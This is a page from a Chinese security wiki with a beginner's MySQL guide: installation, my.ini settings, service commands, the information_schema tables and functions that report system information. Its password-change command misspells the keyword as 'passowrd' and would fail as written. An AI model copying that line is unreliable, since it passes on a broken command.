<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-beta.61">
    <script>
      (function() {
        const userMode = localStorage.getItem('vuepress-reco-color-scheme') || 'auto';
        const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (userMode === 'dark' || (userMode === 'auto' && systemDarkMode)) {
          document.documentElement.classList.toggle('dark', true);
        }
      })();
    </script>
    <link rel="icon" href="/icons/logo.ico"><title>MYSQL | 枫-WIKI</title><meta name="description" content="">
    <link rel="modulepreload" href="/assets/app-98c41aab.js"><link rel="modulepreload" href="/assets/framework-6ecfbe9e.js"><link rel="modulepreload" href="/assets/MySQL.html-ec816f43.js"><link rel="modulepreload" href="/assets/MySQL.html-fcf8b22a.js"><link rel="prefetch" href="/assets/index.html-ef2f4f01.js" as="script"><link rel="prefetch" href="/assets/index.html-6c7f969e.js" as="script"><link rel="prefetch" href="/assets/index.html-db5519aa.js" as="script"><link rel="prefetch" href="/assets/MsSQL.html-3c2d8b69.js" as="script"><link rel="prefetch" href="/assets/index.html-3b4e9d30.js" as="script"><link rel="prefetch" href="/assets/Redis.html-86003711.js" as="script"><link rel="prefetch" href="/assets/informationGathering.html-003c5c93.js" as="script"><link rel="prefetch" href="/assets/index.html-38a16dd6.js" as="script"><link rel="prefetch" href="/assets/socialEngineering.html-e6861d38.js" as="script"><link rel="prefetch" href="/assets/index.html-030f7305.js" as="script"><link rel="prefetch" href="/assets/equalProtectionEvaluation.html-f43b45e8.js" as="script"><link rel="prefetch" href="/assets/index.html-39ba27a6.js" as="script"><link rel="prefetch" href="/assets/riskAssessment.html-8e14903b.js" as="script"><link rel="prefetch" href="/assets/SDLC.html-42ddaf4f.js" as="script"><link rel="prefetch" href="/assets/index.html-7e2b2ca9.js" as="script"><link rel="prefetch" href="/assets/index.html-f4252214.js" as="script"><link rel="prefetch" href="/assets/containerTechnology.html-0c391c25.js" as="script"><link rel="prefetch" href="/assets/microServices.html-db13efa0.js" as="script"><link rel="prefetch" href="/assets/index.html-12eed8a4.js" as="script"><link rel="prefetch" href="/assets/cookie.html-85f166eb.js" as="script"><link rel="prefetch" href="/assets/bruteForce.html-efbcf7df.js" as="script"><link rel="prefetch" href="/assets/CSRF.html-bb014e85.js" as="script"><link rel="prefetch" href="/assets/deserialize.html-961e16b9.js" as="script"><link rel="prefetch" href="/assets/LFR.html-4841bb1e.js" as="script"><link rel="prefetch" href="/assets/LFU.html-8666ff5e.js" as="script"><link rel="prefetch" href="/assets/logicalVulnerability.html-b2431c83.js" as="script"><link rel="prefetch" href="/assets/RCE.html-e2bc82b4.js" as="script"><link rel="prefetch" href="/assets/SQLI.html-a6c871be.js" as="script"><link rel="prefetch" href="/assets/XSS.html-590194bb.js" as="script"><link rel="prefetch" href="/assets/XXE.html-b2f808f1.js" as="script"><link rel="prefetch" href="/assets/HTTP.html-83642a6b.js" as="script"><link rel="prefetch" href="/assets/informationGathering.html-5ddd0da8.js" as="script"><link rel="prefetch" href="/assets/socialEngineering.html-01da104b.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-93862d31.js" as="script"><link rel="prefetch" href="/assets/index.html-f7524c2e.js" as="script"><link rel="prefetch" href="/assets/channel.html-940d1c72.js" as="script"><link rel="prefetch" href="/assets/const.html-00704c8b.js" as="script"><link rel="prefetch" href="/assets/encode.html-cef866c4.js" as="script"><link rel="prefetch" href="/assets/function.html-c541c5ce.js" as="script"><link rel="prefetch" href="/assets/goroutine.html-f8cef4a4.js" as="script"><link rel="prefetch" href="/assets/interface.html-9ffb42a8.js" as="script"><link rel="prefetch" href="/assets/method.html-2650c961.js" as="script"><link rel="prefetch" href="/assets/process.html-a28e8db5.js" as="script"><link rel="prefetch" href="/assets/index.html-1045bec4.js" as="script"><link rel="prefetch" href="/assets/socket.html-dbbcc721.js" as="script"><link rel="prefetch" href="/assets/structure.html-b33e76ff.js" as="script"><link rel="prefetch" href="/assets/sync.html-5d9b5b24.js" as="script"><link rel="prefetch" href="/assets/type.html-cad7491f.js" as="script"><link rel="prefetch" href="/assets/variable.html-34d67fa4.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-cc943aca.js" as="script"><link rel="prefetch" href="/assets/index.html-8d2cc95c.js" as="script"><link rel="prefetch" href="/assets/echo.html-97c945ba.js" as="script"><link rel="prefetch" href="/assets/EOF.html-7b4f1e25.js" as="script"><link rel="prefetch" href="/assets/namespace.html-66752810.js" as="script"><link rel="prefetch" href="/assets/index.html-aefbd11c.js" as="script"><link rel="prefetch" href="/assets/type.html-f4875e1f.js" as="script"><link rel="prefetch" href="/assets/variable.html-562b788d.js" as="script"><link rel="prefetch" href="/assets/404.html-f9875e7b.js" as="script"><link rel="prefetch" href="/assets/index.html-7ce4cb42.js" as="script"><link rel="prefetch" href="/assets/index.html-9bcb1e85.js" as="script"><link rel="prefetch" href="/assets/index.html-8ed78cb0.js" as="script"><link rel="prefetch" href="/assets/MsSQL.html-1cf5885c.js" as="script"><link rel="prefetch" href="/assets/index.html-01664de0.js" as="script"><link rel="prefetch" href="/assets/Redis.html-58289658.js" as="script"><link rel="prefetch" href="/assets/informationGathering.html-6272c20b.js" as="script"><link rel="prefetch" href="/assets/index.html-d0d02398.js" as="script"><link rel="prefetch" href="/assets/socialEngineering.html-449431a3.js" as="script"><link rel="prefetch" href="/assets/index.html-61cd2bdf.js" as="script"><link rel="prefetch" href="/assets/equalProtectionEvaluation.html-0ceb7cc3.js" as="script"><link rel="prefetch" href="/assets/index.html-d1967fca.js" as="script"><link rel="prefetch" href="/assets/riskAssessment.html-052c8fb4.js" as="script"><link rel="prefetch" href="/assets/SDLC.html-d6fb4cfb.js" as="script"><link rel="prefetch" href="/assets/index.html-076e2ec8.js" as="script"><link rel="prefetch" href="/assets/index.html-fb419d42.js" as="script"><link rel="prefetch" href="/assets/containerTechnology.html-b76be2db.js" as="script"><link rel="prefetch" href="/assets/microServices.html-88438ce3.js" as="script"><link rel="prefetch" href="/assets/index.html-c479e573.js" as="script"><link rel="prefetch" href="/assets/cookie.html-4f48b324.js" as="script"><link rel="prefetch" href="/assets/bruteForce.html-1f434fde.js" as="script"><link rel="prefetch" href="/assets/CSRF.html-918c752a.js" as="script"><link rel="prefetch" href="/assets/deserialize.html-a9e69ca0.js" as="script"><link rel="prefetch" href="/assets/LFR.html-59148eb5.js" as="script"><link rel="prefetch" href="/assets/LFU.html-dc710a15.js" as="script"><link rel="prefetch" href="/assets/logicalVulnerability.html-ce3d60cd.js" as="script"><link rel="prefetch" href="/assets/RCE.html-332f6ffe.js" as="script"><link rel="prefetch" href="/assets/SQLI.html-9e5253ae.js" as="script"><link rel="prefetch" href="/assets/XSS.html-1beebe29.js" as="script"><link rel="prefetch" href="/assets/XXE.html-15ad120b.js" as="script"><link rel="prefetch" href="/assets/HTTP.html-8056fbf3.js" as="script"><link rel="prefetch" href="/assets/informationGathering.html-16299cd5.js" as="script"><link rel="prefetch" href="/assets/socialEngineering.html-155e374f.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-02e3c738.js" as="script"><link rel="prefetch" href="/assets/index.html-5a229e7f.js" as="script"><link rel="prefetch" href="/assets/channel.html-04dc13c7.js" as="script"><link rel="prefetch" href="/assets/const.html-cb2f745d.js" as="script"><link rel="prefetch" href="/assets/encode.html-e1230579.js" as="script"><link rel="prefetch" href="/assets/function.html-a9c8198c.js" as="script"><link rel="prefetch" href="/assets/goroutine.html-432b8ca2.js" as="script"><link rel="prefetch" href="/assets/interface.html-3c221783.js" as="script"><link rel="prefetch" href="/assets/method.html-97b96a89.js" as="script"><link rel="prefetch" href="/assets/process.html-046a43e9.js" as="script"><link rel="prefetch" href="/assets/index.html-69263402.js" as="script"><link rel="prefetch" href="/assets/socket.html-1c515d8e.js" as="script"><link rel="prefetch" href="/assets/structure.html-9d37643a.js" as="script"><link rel="prefetch" href="/assets/sync.html-089cd86b.js" as="script"><link rel="prefetch" href="/assets/type.html-e51c73f8.js" as="script"><link rel="prefetch" href="/assets/variable.html-fb6fd503.js" as="script"><link rel="prefetch" href="/assets/environmentConstruction.html-f57a2b09.js" as="script"><link rel="prefetch" href="/assets/index.html-f49b7393.js" as="script"><link rel="prefetch" href="/assets/echo.html-c3d3f981.js" as="script"><link rel="prefetch" href="/assets/EOF.html-80b3fccf.js" as="script"><link rel="prefetch" href="/assets/namespace.html-c252788c.js" as="script"><link rel="prefetch" href="/assets/index.html-38cb73b5.js" as="script"><link rel="prefetch" href="/assets/type.html-3c3b50da.js" as="script"><link rel="prefetch" href="/assets/variable.html-792f785e.js" as="script"><link rel="prefetch" href="/assets/404.html-6a74f1eb.js" as="script"><link rel="prefetch" href="/assets/reco-valine-a0c1af1f.js" as="script"><link rel="prefetch" href="/assets/style-e9220a04.js" as="script"><link rel="prefetch" href="/assets/docsearch-1d421ddb.js" as="script"><link rel="prefetch" href="/assets/index-b98b895d.js" as="script">
    <link rel="preload" href="/assets/style-77410554.css" as="style"><link rel="stylesheet" href="/assets/style-77410554.css">
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container"><!----><!----><div class="common-wrapper series--no series-background--no show-catalog"><div class="wiki-container"><header class="navbar-container" style="transform:translateY(0);"><span class="nav-toggle-botton"><div class="toggle-series-button" aria-expanded="false" role="button" tabindex="0"><div class="icon" aria-hidden="true"><span></span><span></span><span></span></div></div></span><div class="site-brand"><img class="logo" src="/icons/logo.png" alt="枫-WIKI"><a href="/" class="site-name can-hide">枫-WIKI</a></div><!-- <div class="navbar-links-wrapper" :style="linksWrapperStyle"> --><div class="navbar-links-wrapper"><div><!--[--><div id="docsearch-container" style="display:none;"></div><div><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索文档"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索文档</span></span><span class="DocSearch-Button-Keys"><kbd class="DocSearch-Button-Key"><svg width="15" height="15" class="DocSearch-Control-Key-Icon"><path d="M4.505 4.496h2M5.505 5.496v5M8.216 4.496l.055 5.993M10 7.5c.333.333.5.667.5 1v2M12.326 4.5v5.996M8.384 4.496c1.674 0 2.116 0 2.116 1.5s-.442 1.5-2.116 1.5M3.205 9.303c-.09.448-.277 1.21-1.241 1.203C1 10.5.5 9.513.5 8V7c0-1.57.5-2.5 1.464-2.494.964.006 1.134.598 1.24 1.342M12.553 10.5h1.953" stroke-width="1.2" stroke="currentColor" fill="none" stroke-linecap="square"></path></svg></kbd><kbd class="DocSearch-Button-Key">K</kbd></span></button></div><!--]--></div><nav class="navbar-links" id="navbar-web"><!--[--><div class="navbar-links__item"><a href="/docs/WebSecurity/" class="link" aria-label="WEB 安全"><!--[--><!--]--><div class="iconE-container"><img src="/icons/WEB安全.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">WEB 安全</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/OperationalSecurity/" class="link" aria-label="运营安全"><!--[--><!--]--><div class="iconE-container"><img src="/icons/运营安全.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">运营安全</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><div class="dropdown-link"><button class="dropdown-link__title" type="button" aria-label="编程学习"><div class="iconE-container"><img src="/icons/编程学习.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">编程学习</span></div><span class="right arrow"></span></button><button class="dropdown-link--mobile__title" type="button" aria-label="编程学习"><span class="title"><div class="iconE-container"><img src="/icons/编程学习.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">编程学习</span></div></span><span class="right arrow"></span></button><ul style="display:none;" class="dropdown-link__container"><!--[--><li class="dropdown-link__item"><!--[--><h5 class="dropdown-link__subtitle"><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->GoLang<!--]--></span></span></h5><ul class="dropdown-link__subcontainer"><!--[--><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/GoLang/EnvironmentConstruction/" class="link" aria-label="环境搭建"><!--[--><!--]--><div class="iconE-container"><img src="/icons/环境搭建.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">环境搭建</span></div><!--[--><!--]--></a></li><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/GoLang/GrammaticalBasic/" class="link" aria-label="语法基础"><!--[--><!--]--><div class="iconE-container"><img src="/icons/语法基础.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">语法基础</span></div><!--[--><!--]--></a></li><!--]--></ul><!--]--></li><li class="dropdown-link__item"><!--[--><h5 class="dropdown-link__subtitle"><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->PHP<!--]--></span></span></h5><ul class="dropdown-link__subcontainer"><!--[--><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/PHP/EnvironmentConstruction/" class="link" aria-label="环境搭建"><!--[--><!--]--><div class="iconE-container"><img src="/icons/环境搭建.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">环境搭建</span></div><!--[--><!--]--></a></li><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/PHP/GrammaticalBasic" class="link" aria-label="语法基础"><!--[--><!--]--><div class="iconE-container"><img src="/icons/语法基础.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">语法基础</span></div><!--[--><!--]--></a></li><!--]--></ul><!--]--></li><!--]--></ul></div></div><div class="navbar-links__item"><a href="/docs/MessageSection/" class="link" aria-label="留言板块"><!--[--><!--]--><div class="iconE-container"><img src="/icons/留言板块.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">留言板块</span></div><!--[--><!--]--></a></div><!--]--></nav><!--[--><!-- <Xicons
    :icon="icon"
    icon-size="20"
    class="btn-toggle-dark-mode"
    @click="toggleMode()"
  /> --><div class="btn--dark-mode"><div class="iconE-container btn-toggle-dark-mode"><img src="/icons/auto.svg" class="item-icon" alt="item-icon"><!----><!----></div></div><!--]--><!-- <xicons class="btn-toggle-menus" icon="OverflowMenuVertical" :iconSize="20" @click="toggleMenus" /> --><div type="button" class="btn-toggle-menus"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></div></div></header><!-- <SubNavbar v-if="seriesItems.length > 0" @toggleSeries="toggleSeries" /> --><div class="mobile-menus-container"><nav class="navbar-links mobile" id="navbar-web"><!--[--><div class="navbar-links__item"><a href="/docs/WebSecurity/" class="link" aria-label="WEB 安全"><!--[--><!--]--><div class="iconE-container"><img src="/icons/WEB安全.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">WEB 安全</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/docs/OperationalSecurity/" class="link" aria-label="运营安全"><!--[--><!--]--><div class="iconE-container"><img src="/icons/运营安全.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">运营安全</span></div><!--[--><!--]--></a></div><div class="navbar-links__item"><div class="dropdown-link"><button class="dropdown-link__title" type="button" aria-label="编程学习"><div class="iconE-container"><img src="/icons/编程学习.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">编程学习</span></div><span class="right arrow"></span></button><button class="dropdown-link--mobile__title" type="button" aria-label="编程学习"><span class="title"><div class="iconE-container"><img src="/icons/编程学习.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">编程学习</span></div></span><span class="right arrow"></span></button><ul style="display:none;" class="dropdown-link__container"><!--[--><li class="dropdown-link__item"><!--[--><h5 class="dropdown-link__subtitle"><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->GoLang<!--]--></span></span></h5><ul class="dropdown-link__subcontainer"><!--[--><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/GoLang/EnvironmentConstruction/" class="link" aria-label="环境搭建"><!--[--><!--]--><div class="iconE-container"><img src="/icons/环境搭建.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">环境搭建</span></div><!--[--><!--]--></a></li><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/GoLang/GrammaticalBasic/" class="link" aria-label="语法基础"><!--[--><!--]--><div class="iconE-container"><img src="/icons/语法基础.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">语法基础</span></div><!--[--><!--]--></a></li><!--]--></ul><!--]--></li><li class="dropdown-link__item"><!--[--><h5 class="dropdown-link__subtitle"><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->PHP<!--]--></span></span></h5><ul class="dropdown-link__subcontainer"><!--[--><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/PHP/EnvironmentConstruction/" class="link" aria-label="环境搭建"><!--[--><!--]--><div class="iconE-container"><img src="/icons/环境搭建.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">环境搭建</span></div><!--[--><!--]--></a></li><li class="dropdown-link__subitem"><a href="/docs/ProgrammingLearning/PHP/GrammaticalBasic" class="link" aria-label="语法基础"><!--[--><!--]--><div class="iconE-container"><img src="/icons/语法基础.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">语法基础</span></div><!--[--><!--]--></a></li><!--]--></ul><!--]--></li><!--]--></ul></div></div><div class="navbar-links__item"><a href="/docs/MessageSection/" class="link" aria-label="留言板块"><!--[--><!--]--><div class="iconE-container"><img src="/icons/留言板块.svg" class="item-icon" alt="item-icon"><!----><span class="iconE-text">留言板块</span></div><!--[--><!--]--></a></div><!--]--></nav><div class="appearance"><!--[--><!-- <Xicons
    :icon="icon"
    icon-size="20"
    class="btn-toggle-dark-mode"
    @click="toggleMode()"
  /> --><div><div class="iconE-container btn-toggle-dark-mode"><img src="/icons/auto.svg" class="item-icon" alt="item-icon"><!----><!----></div></div><!--]--></div></div><!----><!--[--><aside class="series-container"><!--[--><!--]--></aside><div class="series-background"></div><!--]--><div class="toggle-series"><span class="right arrow"></span></div><!--[--><main class="page-container"><div class="page-hero-image"><!----></div><div class="page-title-container"><!----><h1 class="page-title">MYSQL<span class="blinker"></span></h1></div><div class="page-info"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M16 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M26 30h-2v-5a5 5 0 0 0-5-5h-6a5 5 0 0 0-5 5v5H6v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->YOUZAI<!--]--></span></span><span class="xicon-container left" id="calendar"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->2023/05/10<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M11.17 6l3.42 3.41l.58.59H28v16H4V6h7.17m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2H16l-3.41-3.41A2 2 0 0 0 11.17 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->数据库安全<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M10 14a4 4 0 1 1 4-4a4.005 4.005 0 0 1-4 4zm0-6a2 2 0 1 0 1.998 2.004A2.002 2.002 0 0 0 10 8z" fill="currentColor"></path><path d="M16.644 29.415L2.586 15.354A2 2 0 0 1 2 13.941V4a2 2 0 0 1 2-2h9.941a2 2 0 0 1 1.414.586l14.06 14.058a2 2 0 0 1 0 2.828l-9.943 9.943a2 2 0 0 1-2.829 0zM4 4v9.942L18.058 28L28 18.058L13.942 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->MYSQL<!--]--></span></span><span class="xicon-container left"><!--[--><svg class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 12 12"><g fill="none"><path d="M1.974 6.659a.5.5 0 0 1-.948-.317c-.01.03 0-.001 0-.001a1.633 1.633 0 0 1 .062-.162c.04-.095.099-.226.18-.381c.165-.31.422-.723.801-1.136C2.834 3.827 4.087 3 6 3c1.913 0 3.166.827 3.931 1.662a5.479 5.479 0 0 1 .98 1.517l.046.113c.003.008.013.06.023.11L11 6.5s.084.333-.342.474a.5.5 0 0 1-.632-.314v-.003l-.006-.016a3.678 3.678 0 0 0-.172-.376a4.477 4.477 0 0 0-.654-.927C8.584 4.673 7.587 4 6 4s-2.584.673-3.194 1.338a4.477 4.477 0 0 0-.795 1.225a2.209 2.209 0 0 0-.03.078l-.007.018zM6 5a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM5 7a1 1 0 1 1 2 0a1 1 0 0 1-2 0z" fill="currentColor"></path></g></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[--><span id="/docs/DatabasesSecurity/MySQL.html" class="leancloud-visitors" data-flag-title="Your Article Title"><a class="leancloud-visitors-count" style=""></a></span><!----><!--]--></span></span></div><div class="theme-reco-default-content"><div><h2 id="下载" tabindex="-1"><a class="header-anchor" href="#下载" aria-hidden="true">#</a> 下载</h2><p><a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener noreferrer">https://dev.mysql.com/downloads/mysql/<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><h2 id="初始化" tabindex="-1"><a class="header-anchor" href="#初始化" aria-hidden="true">#</a> 初始化</h2><p>在根目录下创建文件<code>my.ini</code>。</p><div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">client</span><span class="token punctuation">]</span></span>
<span class="token comment"># 设置mysql客户端默认字符集</span>
<span class="token key attr-name">default-character-set</span><span class="token punctuation">=</span><span class="token value attr-value">utf8</span>
 
<span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">mysqld</span><span class="token punctuation">]</span></span>
<span class="token comment"># 设置3306端口</span>
<span class="token key attr-name">port</span> <span class="token punctuation">=</span> <span class="token value attr-value">3306</span>
<span class="token comment"># 设置mysql的安装目录</span>
<span class="token key attr-name">basedir</span><span class="token punctuation">=</span><span class="token value attr-value">D:\\MySQL\\mysql_5.7.40</span>
<span class="token comment"># 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错</span>
<span class="token key attr-name">datadir</span><span class="token punctuation">=</span><span class="token value attr-value">D:\\MySQL\\mysql_5.7.40\\sqldata</span>
<span class="token comment"># 允许最大连接数</span>
<span class="token key attr-name">max_connections</span><span class="token punctuation">=</span><span class="token value attr-value">20</span>
<span class="token comment"># 服务端使用的字符集默认为8比特编码的latin1字符集</span>
<span class="token key attr-name">character-set-server</span><span class="token punctuation">=</span><span class="token value attr-value">utf8</span>
<span class="token comment"># 创建新表时将使用的默认存储引擎</span>
<span class="token key attr-name">default-storage-engine</span><span class="token punctuation">=</span><span class="token value attr-value">INNODB</span>
<span class="token comment"># 添加配置</span>
<span class="token key attr-name">explicit_defaults_for_timestamp</span><span class="token punctuation">=</span><span class="token value attr-value">true</span>
</code></pre></div><p>初始化数据库：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>mysqld <span class="token parameter variable">--initialize</span> <span class="token parameter variable">--console</span> <span class="token comment"># 初始化数据库</span>
</code></pre></div><h2 id="安装" tabindex="-1"><a class="header-anchor" href="#安装" aria-hidden="true">#</a> 安装</h2><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>mysqld <span class="token function">install</span> <span class="token comment"># 安装数据库</span>
</code></pre></div><div class="custom-container tip"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">提示</p><p>记得将 mysql 加入环境变量中。</p></div><h2 id="启动" tabindex="-1"><a class="header-anchor" href="#启动" aria-hidden="true">#</a> 启动</h2><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>net start mysql <span class="token comment"># 启动 mysql 服务</span>
net stop mysql <span class="token comment"># 停止 mysql 服务</span>
</code></pre></div><h2 id="修改密码" tabindex="-1"><a class="header-anchor" href="#修改密码" aria-hidden="true">#</a> 修改密码</h2><p>该方法适用于<code>5.7.x</code>版本。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>mysql<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> passowrd <span class="token keyword">for</span> root@localhost <span class="token operator">=</span> password<span class="token punctuation">(</span><span class="token string">&#39;lol111lol&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 将 root 密码修改成 &#39;lol111lol&#39;</span>
</code></pre></div><h2 id="基础" tabindex="-1"><a class="header-anchor" href="#基础" aria-hidden="true">#</a> 基础</h2><h3 id="information-schema" tabindex="-1"><a class="header-anchor" href="#information-schema" aria-hidden="true">#</a> information_schema</h3><p>MySQL 中系统自带数据库，其中有三张表格，分别是<code>SCHEMATA</code>、<code>TABLES</code>、<code>COLUMNS</code>。</p><ul><li>SCHEMATA</li></ul><p>提供了当前 mysql 实例中所有数据库信息，show databases 的结果就是取自该表。</p><ul><li>TABLES</li></ul><p>提供了关于数据库中的表的信息。</p><ul><li>COLUMNS</li></ul><p>提供了表中的列信息，详细表述了某张表的所有列以及每个列的信息。</p><table><thead><tr><th style="text-align:left;">表名</th><th style="text-align:left;">字段名</th><th style="text-align:left;">说明</th></tr></thead><tbody><tr><td style="text-align:left;"><code>schemata</code></td><td style="text-align:left;">schema_name</td><td style="text-align:left;"><strong>所有数据库的名字</strong></td></tr><tr><td style="text-align:left;"><code>tables</code></td><td style="text-align:left;">table_schema</td><td style="text-align:left;"><strong>表所属数据库的名字</strong></td></tr><tr><td style="text-align:left;"></td><td style="text-align:left;">table_name</td><td style="text-align:left;"><strong>表的名字</strong></td></tr><tr><td style="text-align:left;"><code>columns</code></td><td style="text-align:left;">table_schema</td><td style="text-align:left;"><strong>字段所属数据库的名字</strong></td></tr><tr><td style="text-align:left;"></td><td style="text-align:left;">table_name</td><td style="text-align:left;"><strong>字段所属表的名字</strong></td></tr><tr><td style="text-align:left;"></td><td style="text-align:left;">column_name</td><td style="text-align:left;"><strong>字段的名字</strong></td></tr></tbody></table><h2 id="常用函数" tabindex="-1"><a class="header-anchor" href="#常用函数" aria-hidden="true">#</a> 常用函数</h2><ul><li>获取系统信息</li></ul><div class="language-sql" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 当前用户名。</span>
<span class="token keyword">system_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 当前的用户名和主机名。</span>
<span class="token keyword">session_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># 连接数据库的用户名。</span>
@<span class="token variable">@basedir</span>    <span class="token comment"># mysql 安装路径。</span>
@<span class="token variable">@datadir</span>    <span class="token comment"># 数据库路径。</span>
version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 返回当前数据库的版本信息。</span>
@<span class="token variable">@version_compile_os</span>	<span class="token comment"># 操作系统版本。</span>
